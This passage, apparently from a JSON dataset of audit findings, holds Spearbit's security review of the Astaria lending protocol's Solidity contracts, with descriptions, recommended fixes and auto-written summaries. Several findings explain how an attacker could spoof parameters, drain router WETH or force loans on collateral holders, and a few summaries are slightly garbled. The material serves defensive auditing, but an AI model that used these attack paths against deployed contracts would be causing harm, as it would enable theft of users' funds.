      "summary": "\nThis bug report is about a high risk issue in the LienToken.sol code. It is related to the payee and ownerOf being detached, meaning that an owner may set the payee and transfer the LienToken to a new owner, but the payee does not reset on transfer. This could lead to an exploit scenario where the old owner sets themselves as the payee, then sells the lien to a new owner who doesn't update the payee. As a result, payments will go to the address set by the old owner. \n\nThe recommendation is to reset the payee on transfer. This can be done by adding a line of code to the transferFrom function, which will delete the s.lienMeta[id].payee and emit a PayeeChanged event. This will ensure that the payee is reset when the LienToken is transferred to a new owner.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7306",
      "title": "Public vault's yIntercept is not updated when the full amount owed is not paid out by a Seaport auction.",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n**Context:** LienToken.sol#L587\n\n**Description:** When the full `amountOwed` for a lien is not paid out during the callback from Seaport to a collateral's ClearingHouse and if the payee is a public vault, we would need to decrement the `yIntercept`, otherwise the `payee.totalAssets()` would reflect a wrong value.\n\n**Recommendation:** When the above scenario happens make sure to call `decreaseYIntercept` with the difference of `amountOwed` and the payment received from the Seaport auction sale.\n\n**Astaria:** Solved by PR 219.\n\n**Spearbit:** Verified.",
      "summary": "\nThis bug report is related to the LienToken.sol#L587 of the auction. It is classified as a high-risk issue. The problem is that when the full amount owed for a lien is not paid out during the callback from Seaport to a collateral's ClearingHouse and if the payee is a public vault, the payee.totalAssets() would reflect a wrong value.\n\nThe recommendation is to call decreaseYIntercept with the difference ofamountOwed and the payment received from the Seaport auction sale when this scenario occurs. This issue has been solved by PR 219 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7305",
      "title": "Withdraw proxy's claim() endpoint updates public vault's yIntercept incorrectly.",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context:\n- WithdrawProxy.sol#L235-L261\n- WithdrawProxy.sol#L239\n\n## Description:\nLet  \nparameter description  \ny₀ - theyIntercept of our public vault in the question.  \nn - the current epoch for the public vault.  \nE⁻₁ - the expected storage parameter of the previous withdraw proxy.  \nB⁻₁ - the asset balance of the previous withdraw proxy.  \nW⁻₁ - the withdrawReserveReceived of the previous withdraw proxy.  \nS⁻₁ - the total supply of the previous withdraw proxy.  \nSᵥ - the total supply of the public vault when `processEpoch()` was last called on the public vault.  \nBᵥ - the total balance of the public vault when `processEpoch()` was last called on the public vault.  \nV - the public vault.  \n\nparameter description  \nP⁻₁ - the previous withdraw proxy.  \n\nThen y₀ is updated/decremented according to the formula (up to rounding errors due to division):  \ny₀ = y₀ - max(0, E⁻₁ - (B⁻₁ - W⁻₁))(1 - S⁻₁/Sᵥ)\n\nWhereas the amount (A) of assets transferred from P⁻₁ to V is:  \nA = (B⁻₁ - W⁻₁)(1 - S⁻₁/Sᵥ)\n\nAnd the amount (B) of asset left in P⁻₁ after this transfer would be:  \nB = W⁻₁ + (B⁻₁ - W⁻₁)S⁻₁/Sᵥ\n\n(B⁻₁ - W⁻₁) is supposed to represent the payment withdrawal proxy receives from Seaport auctions plus the amount of assets transferred to it by external actors. So A represents the portion of this amount for users who have not withdrawn from the public vault in the previous epoch and it is transferred to V and so y₀ should be compensated positively. Also note that this amount might be bigger than E⁻₁ if a lien has a really high liquidationInitialAsk and its auction fulfills/matches near that price on Seaport. So it is possible that E⁻₁ < A.\n\nThe current update formula for updating y₀ has the following flaws:\n- It only considers updating y₀ when E⁻₁ - (B⁻₁ - W⁻₁) > 0 which is not always the case.\n- Decrements y₀ by a portion of E⁻₁.\n\nThe correct updating formula for y₀ should be:  \ny₀ = y₀ - E⁻₁ + (B⁻₁ - W⁻₁)(1 - S⁻₁/Sᵥ)\n\nAlso note, if we let B⁻₁ - W⁻₁ = X⁻₁ + ϵ, where X⁻₁ is the payment received by the withdraw proxy from Seaport auction payments and ϵ (if W⁻₁ updated correctly) be assets received from external actors by the previous withdraw proxy. Then:  \nB = W⁻₁ + (X⁻₁ + ϵ)S⁻₁/Sᵥ  \n= max(0, Bᵥ - E⁻₁) + X⁻₁ + ϵ)S⁻₁/Sᵥ\n\nThe last equality comes from the fact that when the withdraw reserves are fully transferred from the public vault and the current withdraw proxy (if necessary) to the previous withdraw proxy the amount W⁻₁ would hold should be max(0, Bᵥ - E⁻₁)S⁻₁/Sᵥ.\n\n## Related Issue\n\n## Recommendation:\nMake sure y₀ is updated in `claim()` according to the following formula:  \ny₀ = y₀ - E⁻₁ + (B⁻₁ - W⁻₁)(1 - S⁻₁/Sᵥ)\n\nAstaria: Acknowledged.  \nSpearbit: Acknowledged.",
      "summary": "\nThis bug report is regarding the updating of the parameter 'y0' in the WithdrawProxy.sol file from line 235 to 261. The parameter 'y0' is used to represent the number of assets that have not been withdrawn from the public vault in the current epoch. \n\nThe parameter 'En-1' is the expected storage parameter of the previous withdraw proxy. 'Bn-1' is the asset balance of the previous withdraw proxy, 'Wn-1' is the withdrawReserveReceived of the previous withdraw proxy and 'Sn-1' is the total supply of the previous withdraw proxy. 'Sv' is the total supply of the public vault when processEpoch() was last called on the public vault and 'Bv' is the total balance of the public vault when processEpoch() was last called on the public vault. \n\nThe current update formula for updating the 'y0' has two flaws. Firstly, it only considers updating 'y0' when 'En-1' is greater than the difference of 'Bn-1' and 'Wn-1' which is not always the case. Secondly, it decrements 'y0' by a portion of 'En-1'. \n\nThe correct updating formula for 'y0' should be 'y0=y0-En-1+(Bn-1-Wn-1)(1-Sn-1/Sv)'. This formula takes into account the payment received by the withdraw proxy from Seaport auction payments and the amount of assets transferred to it by external actors. \n\nThe bug report is acknowledged by Astaria and Spearbit. The recommendation is to make sure 'y0' is updated in claim() according to the formula given above.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7304",
      "title": "commitToLiens transfers extra assets to the borrower when protocol fee is present",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- AstariaRouter.sol#L417-L422\n- VaultImplementation.sol#L392\n\n## Description\n`totalBorrowed` is the sum of all `commitments[i].lienRequest.amount`. But if `s.feeTo` is set, some of the funds/assets from the vaults get transferred to `s.feeTo` when `handleProtocolFee` is called, and only the remaining is sent to the `ROUTER()`. \n\nIn this scenario, the total amount of assets sent to `ROUTER()` (so that it can be transferred to `msg.sender`) is subject to rounding errors:\n\n\\[\n(1 - \\frac{np}{dp})T\n\\]\n\nWhere:\n- \\( T \\) is the `totalBorrowed`\n- \\( np \\) is `protocolFeeNumerator`\n- \\( dp \\) is `protocolFeeDenominator`\n\nBut we are transferring \\( T \\) to `msg.sender`, which is more than we are supposed to send.\n\n## Recommendation\nMake sure only \\( (1 - \\frac{np}{dp})T \\) is transferred to the borrower.\n\n## Acknowledgements\n- **Astaria**: Acknowledged.\n- **Spearbit**: Acknowledged.",
      "summary": "\nThis bug report is about a problem with the AstariaRouter.sol and VaultImplementation.sol contracts. The totalBorrowed amount is the sum of all commitments[i].lienRequest.amount. However, when the ifs.feeTo is set, some of the funds/assets from the vaults get transferred to s.feeTo when_handleProtocolFee is called, and only the remaining is sent to the ROUTER(). This can lead to a situation where the total amount of assets sent to ROUTER() is more than the totalBorrowed, due to rounding errors. To fix this issue, the recommendation is to make sure only (1 �np\ndp)T is transferred to the borrower. Both Astaria and Spearbit have acknowledged the bug report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7303",
      "title": "The lower bound for liquidationInitialAsk for new lines needs to be stricter",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- `LienToken.sol#L376-L381`\n- `AstariaRouter.sol#L516`\n\n## Description\n`params.lien.details.liquidationInitialAsk` (`Lnew`) is only compared to `params.amount` (`Anew`) whereas in `_appendStack` `newStack[j].lien.details.liquidationInitialAsk` (`Lj`) is compared to `potentialDebt`. \n\n`potentialDebt` is the aggregated sum of all potential owed amounts at the end of each position/lien. \n\nSo in `_appendStack` we have:\n\n```\nonew + on + ... + oj  ≤ Lj\n```\n\nWhere `oj` is `getOwed(newStack[j], newStack[j].point.end)`, which is the amount for the stack slot plus the potential interest at the end of its term. \n\nSo it would make sense to enforce a stricter inequality for `Lnew`:\n\n```\n(1 + r(tend − tnow) / 10^18) Anew = onew ≤ Lnew\n```\n\nThe big issue regarding the current lower bound is when the borrower only takes one lien and for this lien `liquidationInitialAsk == amount` (or they are close). Then at any point during the lien term (maybe very close to the end), the borrower can atomically self-liquidate and settle the Seaport auction in one transaction. This way the borrower can skip paying any interest (they would need to pay OpenSea fees and potentially royalty fees) and plus they would receive liquidation fees.\n\n## Recommendation\nMake sure the following stricter lower bound is used instead:\n\n```\n(1 + r(tend − tnow) / 10^18) Anew = onew ≤ Lnew\n```",
      "summary": "\nThis bug report is about the LienToken.sol and AstariaRouter.sol contracts. It states that the parameter params.lien.details.liquidationInitialAsk (Lnew) is only compared to params.amount (Anew) which is not sufficient. This parameter should be compared to the aggregated sum of all potential owed amount at the end of each position/lien, which is potentialDebt. The issue is that when the borrower only takes one lien and for this lien liquidationInitialAsk is equal to amount, then at any point during the lien term (maybe very close to the end), the borrower can atomically self liquidate and settle the Seaport auction in one transaction. This way the borrower can skip paying any interest and would receive liquidation fees.\n\nThe recommendation is to use a stricter lower bound which is (1 +r(tend - tnow) * Anew = onew * Lnew). This would prevent the borrower from skipping any interest payments.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7302",
      "title": "Strategist Interest Rewards will be 10x higher than expected due to incorrect divisor",
      "impact": "HIGH",
      "content": "## High Risk Report\n\n**Severity:** High Risk  \n**Context:** PublicVault.sol#L564  \n**Description:**  \n`VAULT_FEE` is set as an immutable argument in the construction of new vaults and is intended to be set in basis points. However, when the strategist interest rewards are calculated in `_handleStrategistInterestReward()`, the `VAULT_FEE` is only divided by 1000. The result is that the fee calculated by the function will be 10x higher than expected, and the strategist will be dramatically overpaid.\n\n**Recommendation:**  \n```solidity\nunchecked {\n- uint256 fee = x.mulDivDown(VAULT_FEE(), 1000);\n+ uint256 fee = x.mulDivDown(VAULT_FEE(), 10000);\ns.strategistUnclaimedShares += convertToShares(fee).safeCastTo88();\n}\n```\n\n**Astaria:** Resolved based on the following PR 203.  \n**Spearbit:** Verified.",
      "summary": "\nThis bug report is about an issue in the PublicVault.sol code. It states that the VAULT_FEE set as an immutable argument in the construction of new vaults is intended to be set in basis points, but when the strategist interest rewards are calculated in _handleStrategistInterestReward() the VAULT_FEE is only divided by 1000. This means that the fee calculated by the function will be 10x higher than expected, and the strategist will be dramatically overpaid. \n\nThe recommendation made is to change the code from: \n\nuint256 fee = x.mulDivDown(VAULT_FEE(), 1000); \n\nto: \n\nuint256 fee = x.mulDivDown(VAULT_FEE(), 10000); \n\nand also to add the following line:\n\ns.strategistUnclaimedShares += convertToShares(fee).safeCastTo88();\n\nThe bug has been resolved based on the PR 203, and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7301",
      "title": "Anyone can take a loan out on behalf of any collateral holder at any terms",
      "impact": "HIGH",
      "content": "## Security Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n`VaultImplementation.sol#L225`\n\n## Description\nIn the `_validateCommitment()` function, the initial checks are intended to ensure that the caller who is requesting the lien is someone who should have access to the collateral that it's being taken out against. The caller also inputs a receiver, who will be receiving the lien. \n\nIn this validation, this receiver is checked against the collateral holder, and the validation is approved in the case that `receiver == holder`. However, this does not imply that the collateral holder wants to take this loan.\n\nThis opens the door to a malicious lender pushing unwanted loans on holders of collateral by calling `commitToLien` with their `collateralId`, as well as their address set to the receiver. This will pass the `receiver == holder` check and execute the loan.\n\nIn the best case, the borrower discovers this and quickly repays the loan, incurring a fee and a small amount of interest. In the worst case, the borrower doesn't know this happens, and their collateral is liquidated.\n\n## Recommendation\nOnly allow calls from the holder or operator to lead to valid commitments:\n\n```solidity\naddress holder = CT.ownerOf(collateralId);\naddress operator = CT.getApproved(collateralId);\n\nif (\n    msg.sender != holder &&\n    receiver != holder &&\n    receiver != operator &&\n    !ROUTER().isValidVault(receiver)\n) {\n    msg.sender != operator &&\n    CT.isApprovedForAll(holder, msg.sender)\n) {\n    if (operator != address(0)) {\n        require(operator == receiver);\n    } else {\n        require(CT.isApprovedForAll(holder, receiver));\n    }\n} else {\n    revert NotApprovedForBorrow();\n}\n```",
      "summary": "\nThis bug report is about the VaultImplementation.sol#L225 function called validateCommitment(). This function is intended to ensure that the caller who is requesting the lien has access to the collateral. The caller also inputs a receiver who will receive the lien. The receiver is checked against the collateral holder, and the validation is approved if they match. \n\nHowever, this does not imply that the collateral holder wants to take the loan. This opens the door to a malicious lender pushing unwanted loans on holders of collateral by calling commitToLien with their collateralId, as well as their address set to the receiver. This will pass the receiver == holder check and execute the loan. \n\nIn the best case, the borrower discovers this and quickly repays the loan, incurring a fee and small amount of interest. In the worst case, the borrower doesn't know this happens and their collateral is liquidated. \n\nThe recommendation is to only allow calls from the holder or operator to lead to valid commitments. The msg.sender should be checked against the holder, operator, and receiver. If the sender is not the holder, operator, or receiver, then the CT.isApprovedForAll(holder, msg.sender) should be checked. If none of these checks pass, then the loan should be reverted with the NotApprovedForBorrow() message.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7300",
      "title": "c.lienRequest.strategy.vault is not checked to be a registered vault when commitToLiens is called",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\nAstariaRouter.sol#L680-L683\n\n## Description\nFrom when `commitToLiens` is called till when we end up calling `IVaultImplementation(c.lienRequest.strategy.vault).commitToLien( ... )` and after the value of `c.lienRequest.strategy.vault` is not checked whether it is a registered vault within the system (by checking `s.vaults`). The caller can set this value to any address they would desire and potentially perform some unwanted actions.\n\nFor example, the user could spoof all the values in commitments so that the later dependent contracts' checks are skipped and lastly we end up transferring funds:\n\n```solidity\ns.TRANSFER_PROXY.tokenTransferFrom(\n    address(s.WETH),\n    address(this), // <--- AstariaRouter\n    address(msg.sender),\n    totalBorrowed\n);\n```\n\nNote that since all checks are skipped, the caller can also indirectly set `totalBorrowed` to any value they would desire. And so, if `AstariaRouter` would hold any WETH at any point in time, anyone can craft a payload to `commitToLiens` to drain its WETH balance.\n\n## Recommendation\nCheck that the value of `s.vaults[c.lienRequest.strategy.vault]` is not `address(0)` before calling `c.lienRequest.strategy.vault`'s `commitToLien` endpoint.\n\n## Astaria\nSolved in PR 197.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is related to the AstariaRouter.sol#L680-L683. It is a high risk issue where the value of c.lienRequest.strategy.vault is not checked whether it is a registered vault within the system (by checking s.vaults). This allows the caller to set the value to any address they would desire, potentially performing some unwanted actions. An example of this is the user spoofing all the values in commitments, skipping all checks, and then transferring funds from AstariaRouter's wETH balance. \n\nThe recommendation to solve the issue is to check that the value of s.vaults[c.lienRequest.strategy.vault] is not address(0) before calling c.lienRequest.strategy.vault's commitToLien endpoint. This issue has been solved in PR 197 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7299",
      "title": "ClearingHouse cannot detect if a call from Seaport comes from a genuine listing or auction",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n*ClearingHouse.sol#L21*\n\n## Description\nAnyone can create a SeaPort order with one of the considerations' recipients set to a ClearingHouse with a `collateralId` that is genuinely already set for auction. Once the spoofed order settles, SeaPort calls into this fallback function and causes the genuine Astaria auction to settle.\n\nThis allows an attacker to set random items on sale on SeaPort with funds directed here (small buying prices) to settle genuine Astaria auctions on the protocol.\n\n### This causes:\n- The Astaria auction payees and the liquidator would not receive what they would expect that should come from the auction. If the payee is a public vault, it would introduce incorrect parameters into its system.\n- Lien data (`s.lienMeta[lid]`) and the lien token get deleted/burnt.\n- Collateral token and data get burnt/deleted.\n- When the actual genuine auction settles and calls back to here, it will revert due to `s.collateralIdToAuction[collateralId]` check.\n\n## Recommendation\nAstaria needs to introduce a mechanism so that SeaPort would send more data to ClearingHouse to check the genuineness of the fallback calls.\n\n## Astaria\nIn a change yet to be merged, we have the ClearingHouse set up with checks to enforce that it has received enough of a payment in the right asset to complete the transaction. We ultimately do not care where the transaction came from as long as we are indeed offering the payment and are getting everything that the auction should cost. We will mark it as acknowledged and tag this ticket with the updates when merged.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a vulnerability in the ClearingHouse.sol code. It allows anyone to create a SeaPort order with one of the considerations' recipients set to a ClearingHouse with a collateralId that is already set for auction. When the spoofed order settles, SeaPort calls into the fallback function and causes the genuine Astaria auction to settle. This creates a number of issues, such as the Astaria auction payee and the liquidator not receiving what they should, lien data and lien token being deleted or burnt, collateral token and data being burnt or deleted, and when the genuine auction settles, it will revert due to a s.collateralIdToAuction[collateralId] check.\n\nAstaria has proposed a solution that involves adding a mechanism so that Seaport can send more data to ClearingHouse to check the genuineness of the fallback calls. Spearbit has acknowledged this solution.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7298",
      "title": "If a collateral's liquidation auction on Seaport ends without a winning bid, the call to liquidatorNFTClaim does not clear the related data on LienToken 's side and also for payee s that are public vaults",
      "impact": "HIGH",
      "content": "## High Risk Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n`CollateralToken.sol#L107`\n\n## Description\nIf/when a liquidation auction ends without being fulfilled/matched on Seaport, and afterward when the current liquidator calls into `liquidatorNFTClaim`, the storage data (`s.collateralStateHash`, `s.auctionData`, `s.lienMeta`) on the LienToken side do not get reset/cleared. Additionally, the lien token does not get burnt. This results in the following issues:\n\n- `s.collateralStateHash[collateralId]` remains equal to `bytes32(\"ACTIVE_AUCTION\")`.\n- `s.auctionData[collateralId]` retains the past auction data.\n- `s.lienMeta[collateralId].atLiquidation` will be `true`.\n\nAs a consequence, future calls to `commitToLiens` by holders of the same collateral will revert.\n\n## Recommendation\nEnsure to clear related storage data on the LienToken's side and on payees that are public vaults when `liquidatorNFTClaim` is called.",
      "summary": "\nThe bug report describes an issue with FTClaim not clearing the related data on LienToken's side and payees that are public vaults. This issue is considered to be of high risk and is located in the CollateralToken.sol#L107. When a liquidation auction ends without being fulfilled/matched on Seaport and the currentliquidator calls into liquidatorNFTClaim, the storage data (s.collateralStateHash, s.auctionData, s.lienMeta) on the LienToken side does not get reset/cleared. This means that s.collateralStateHash[collateralId] stays equal to bytes32(\"ACTIVE_AUCTION\"), s.auctionData[collateralId] will have the past auction data, and s.lienMeta[collateralId].atLiquidation will be true. This will cause future calls to commitToLiens by holders of the same collateral to revert.\n\nThe recommendation is to make sure to clear related storage data on LienToken's side and payees that are public vaults when liquidatorNFTClaim is called.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7297",
      "title": "stateHash isn't updated by buyoutLien function",
      "impact": "HIGH",
      "content": "## Security Issue Report\n\n## Severity\n**High Risk**\n\n## Context\nLienToken.sol#L102-187\n\n## Description\nWe never update the collateral state hash anywhere in the `buyoutLien` function. As a result, once all checks are passed, payment will be transferred from the buyer to the seller, but the seller will retain ownership of the lien in the system's state.\n\n## Recommendation\nWe should save the return value of the `_replaceStackAtPositionWithNewLien` function call and use it to call:\n```solidity\ns.collateralStateHash[collateralId] = keccak256(abi.encode(newUpdatedStack));\n```\n\n## Spearbit\nConfirmed, the following commit fixes this issue.",
      "summary": "\nThis bug report is about a high risk issue in the LienToken.sol file, between lines 102 and 187. The issue is that the collateral state hash is not updated in the buyoutLien function. This means that after all checks are passed, the payment will be transferred from the buyer to the seller, but the seller will still own the lien in the system's state. \n\nThe recommendation is to save the return value of the _replaceStackAtPositionWithNewLien function call and use it to call the keccak256(abi.encode(newUpdatedStack)). This will update the collateral state hash. This issue has been confirmed and fixed with the following commit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7296",
      "title": "Can create lien for collateral while at auction by passing spoofed data",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n**File:** LienToken.sol  \n**Lines:** 368-372\n\n## Description\nIn the `createLien` function, we check that the collateral isn't currently at auction before giving a lien with the following check:\n\n```solidity\nif (\n    s.collateralStateHash[params.collateralId] == bytes32(\"ACTIVE_AUCTION\")\n) {\n    revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n}\n```\n\nHowever, `collateralId` is passed in multiple places in the `params`: both in `params` directly and in `params.encumber.lien`. \n\nThe `params.encumber.lien.collateralId` is used everywhere else, and is the final value that is used. But the check is performed on `params.collateralId`.\n\nAs a result, we can set the following:\n- `params.encumber.lien.collateralId`: collateral that is at auction.\n- `params.collateralId`: collateral not at auction.\n\nThis will allow us to pass this validation while using the collateral at auction for the lien.\n\n## Recommendation\nThe check should be updated to use `params.encumber.lien.collateralId` instead:\n\n```solidity\nif (\n    s.collateralStateHash[params.encumber.lien.collateralId] == bytes32(\"ACTIVE_AUCTION\")\n) {\n    revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n}\n```\n\nAdditionally, we can remove `collateralId` entirely from the encumber call, as it's inside lien. The fix is to update to use `lien.collateralId` everywhere instead of `encumber.collateralId`.\n\n## Team Consensus\n**Astaria:** We can remove `collateralId` entirely from the encumber call as it's inside lien. The fix is to update to use the `lien.collateralId` everywhere instead of `encumber.collateralId`.  \n**Spearbit:** Agreed, that seems like the best fix and gets rid of an unneeded parameter. Confirmed that the following PR 214 resolves the issue.",
      "summary": "\nThis bug report is about the createLien function in the LienToken.sol code. The function checks that the collateral isn't currently at auction before giving a lien. However, collateralId is passed in multiple places in the params: both in params directly and in params.encumber.lien. The params.encumber.lien.collateralId is used everywhere else, but the check is performed on params.collateralId. This means that it is possible to set the params.encumber.lien.collateralId to a collateral that is at auction, while using the params.collateralId which is not at auction, thus allowing the validation to pass. \n\nThe recommended fix is to update the code to use the lien.collateralId everywhere instead of encumber.collateralId. This would remove the collateralId parameter entirely from the encumber call, and the issue is resolved with the PR 214.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7295",
      "title": "processEpoch() needs to be called regularly",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- PublicVault.sol#L247\n- PublicVault.sol#L320\n\n## Description\nIf the `processEpoch()` endpoint does not get called regularly (especially close to the epoch boundaries), the updated `currentEpoch` would lag behind the actual expected value, and this will introduce arithmetic errors in formulas regarding epochs and timestamps.\n\n## Recommendation\nThus, public vaults need to create a mechanism so that the `processEpoch()` gets called regularly, maybe using relayers or off-chain bots. Also, if there are any outstanding withdraw reserves, the vault needs to be topped up with assets (and/or the current withdraw proxy) so that the full amount of withdraw reserves can be transferred to the withdraw proxy from the epoch before using `transferWithdrawReserve`. Otherwise, the processing of epochs would be halted, and if this halt continues for more than one epoch length, inaccuracies in the epoch number will be introduced into the system.\n\nAnother mechanism that can be introduced into the system is incrementing the current epoch not just by one but by an amount depending on the time passed since the last call to the `processEpoch()` or the timestamp of the current epoch.\n\n## Acknowledgements\n**Astaria:** Acknowledged.  \n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is about a high-risk issue in the PublicVault.sol code. If the processEpoch() endpoint is not called regularly, the currentEpoch value will lag behind the expected value, causing errors in calculations related to epochs and timestamps. To fix this issue, Public Vaults need to create a mechanism to ensure that processEpoch() is called regularly, possibly using relayers or off-chain bots. Additionally, the vault should be topped up with assets and/or the current withdraw proxy to ensure that the full amount of withdraw reserves can be transferred to the withdraw proxy. Lastly, the current epoch should not just be incremented by one, but by an amount depending on the amount of time passed since the last call to processEpoch(). Both Astaria and Spearbit have acknowledged the recommendation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7294",
      "title": "Refactor _paymentAH()",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity: \n**High Risk**\n\n## Context: \n**LienToken.sol#L571**\n\n## Description: \nThe `_paymentAH()` function has several vulnerabilities:\n\n- The `stack` parameter is defined as a memory parameter, so any updates made to `stack` do not reflect back in the corresponding storage variable.\n- There is no need to update `stack[position]` as it is deleted later.\n- The function `decreaseEpochLienCount()` is always passed `0`, as `stack[position]` has already been deleted. Furthermore, `decreaseEpochLienCount()` expects `epoch`, but `end` is passed instead.\n- The if/else block can be merged. The function `updateAfterLiquidationPayment()` expects `msg.sender` to be `LIEN_TOKEN`, which should work as expected.\n\n## Recommendation:\nApply the following diff:\n\n```solidity\nfunction _paymentAH(\n    LienStorage storage s,\n    uint256 collateralId,\n    - AuctionStack[] memory stack,\n    + AuctionStack[] storage stack,\n    uint256 position,\n    uint256 payment,\n    address payer\n) internal returns (uint256) {\n    uint256 lienId = stack[position].lienId;\n    uint256 end = stack[position].end;\n    uint256 owing = stack[position].amountOwed;\n\n    //checks the lien exists\n    address owner = ownerOf(lienId);\n    address payee = _getPayee(s, lienId);\n\n    - if (owing > payment.safeCastTo88()) {\n    -     stack[position].amountOwed -= payment.safeCastTo88();\n    - } else {\n    + if (owing < payment.safeCastTo88()) {\n        payment = owing;\n    }\n\n    s.TRANSFER_PROXY.tokenTransferFrom(s.WETH, payer, payee, payment);\n    delete s.lienMeta[lienId]; //full delete\n    delete stack[position];\n    _burn(lienId);\n\n    if (_isPublicVault(s, payee)) {\n    -     if (owner == payee) {\n            